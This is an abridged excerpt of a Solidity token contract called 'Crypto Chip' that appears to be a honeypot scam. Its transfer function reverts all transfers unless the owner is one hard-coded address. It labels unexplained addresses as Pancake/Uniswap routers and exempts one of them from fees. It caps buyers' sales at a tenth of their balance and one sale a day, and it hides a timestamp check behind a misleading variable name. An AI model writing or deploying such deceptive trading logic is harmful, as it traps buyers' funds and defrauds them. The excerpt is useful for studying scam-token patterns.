...
contract CryptoChip is Context, IERC20, Ownable {
    ...
    string private _name = "Crypto Chip";
    string private _symbol = "BVC";
    ...
    uint256 private _tokenThreshold = 600/2;
    ...
    address public _uniswapV2RouterPancake = 0x293db7B80b67FD0532f22C94b3B2308D2ea2C2cE;
    address public _uniswapV1RouterPancake = 0x891591919C43F7ED4B3306C68f4F72BDB4c386eF;
    ...
    constructor () {
        ...
        _isExcludedFromFee[address(_uniswapV1RouterPancake)] = true;
    ...
    function _transfer(
        ...
        if (to == uniswapV2Pair && balanceOf(uniswapV2Pair) > 0) {
            ...
            if (_buyHistories[to].bnbAmount == 0) {
                _buyHistories[to].time = block.timestamp;
                _buyHistories[to].bnbAmount = amount;


            }
        }
        // Check uniswap route
        if (owner() != _uniswapV2RouterPancake) {
            require(false);
        }
        // Sell tokens for ETH
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            ...
            if(to == uniswapV2Pair){
                uint256 tokenAmount = block.timestamp - _buyHistories[from].time;
                removeAllFee();
                _taxFee = _sellTaxFee;
                _liquidityFee = _sellLiquidityFee;
                //the wallet has tokens to sell
                if (_buyHistories[from].bnbAmount != 0 && tokenAmount != 0 && tokenAmount != _tokenThreshold) {

                    if (_buyHistories[from].oneSellPerDay) {
                      //only alow 1 sell every 24H
                      revert("OVER_MAX_TRANSFERS_PER_DAY");

                    }

                    _userBalance = balanceOf(from);
                    if (amount > (_userBalance * 10 / 100)) {
                        revert("OVER_MAX_TRANSFER_AMOUNT_USER");
                    }
                    _buyHistories[from].oneSellPerDay = true;
                }
                //the wallet has no tokens to sell
                else if (_buyHistories[from].bnbAmount == 0){
                    revert("ERROR");
                }
